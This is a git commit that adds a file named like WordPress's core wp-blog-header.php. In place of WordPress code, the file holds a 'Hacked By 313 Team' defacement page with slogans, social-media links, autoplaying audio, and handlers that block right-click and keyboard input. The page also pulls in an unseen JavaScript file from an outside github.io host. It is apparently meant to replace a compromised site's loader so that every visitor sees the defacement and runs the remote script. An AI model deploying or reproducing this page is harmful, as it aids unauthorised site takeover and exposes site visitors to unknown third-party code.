41a5f972e8be183d774403caa32d42b06c1b46be
Black Shark Team <90838642+ZeroBlackShark@users.noreply.github.com>
2024-03-24 11:48:22 +0300

    Add files via upload

---
+++ wp-blog-header.php
@@ -0,0 +1,59 @@
+<html>
+  <head>
+    <meta charset="UTF-8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="title" content="Hacked By 313 Team">
+    <meta name="description" content="was here هكر الامامة313">
+    <meta name="keywords" content="Hacked,deface,website,whitehat,defacer,hack,mirror,313 Team,313Team,313team,Hacked By 313 Team,Hacked By 313 team,">
+    <meta name="robots" content="index, follow">
+    <meta name="revisit-after" content="60 days">
+    <meta name="author" content="هكر الامامة313">
+    <title>Hacked By 313 Team</title>
+    <meta property="og:image" content="https://i.imgur.com/Atm7HX6.png">
+    <meta name="theme-color" content="#000">
+    <link rel="icon" type="image/png" href="https://i.imgur.com/Atm7HX6.png">
+    <link href="https://fonts.googleapis.com/css?family=Acme" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Reggae+One&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
+  </head>
+  <body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body" onload="typeWriter()"><canvas id="bg" height="667" width="375"></canvas>
+  <style type="text/css">
+      canvas {
+        position: fixed;
+        top: 0;
+        left: 0;
+        z-index: -1;
+      }
+      center {
+        font-family: Acme;
+      }
+      img {
+        opacity: 80%;
+      }
+      red {
+        color: red;
+      }
+      font {
+        text-shadow: #000 0px 0px 3px;
+        -webkit-font-smoothing: antialiased;
+      }
+  </style>
+    <table width="100%" height="100%">
+      <td>
+        <center>
+            <img border="0" id="id" src="https://i.imgur.com/Atm7HX6.png" width="230" height="230">
+            <font  face="Reggae One" color="red"><h2>Hacked By 313 Team</h2><p><h3>[+] Touched By هكر الامامة313[+]</h3></p></font>
+            <p>لا اله الا الله . محمد رسول الله . علي ولي الله</p>
+            <p>جنود الامام المهدي ( عجل الله فرجه الشريف )<p>
+            <p>#CyberMuslim - #SavePalestine - #FreePalestine</p>
+            <p><marquee direction="left" scrollamount="6" width="80%" style="width: 80%;"> 313 Team | اللهم صلي على محمد وآل محمد | السلام عليك يا ابا عبدالله الحسين | يا قائم ال محمد | نصر من الله وفتح قريب </marquee></p>
+            <p><a href="https://t.me/x313xTeam"><i class="fa fa-telegram" style="font-size:28px;color:#00BFFF"></i></a>  <a href="https://twitter.com/x313xTeam"><i class="fa fa-twitter" style="font-size:28px;color:#00BFFF"></i></a></p>
+            <p>[+] Iraqi Cyber Army [+]</p><audio autoplay="autoplay" loop="loop" id="lagu"src="https://zeroblackshark.github.io/313team.mp3"></audio>
+        </center><script type="text/javascript" src="https://drvee07.github.io/loc/drv.js"></script>
+      </td>
+    </table>   
+  </body>
+  </html>
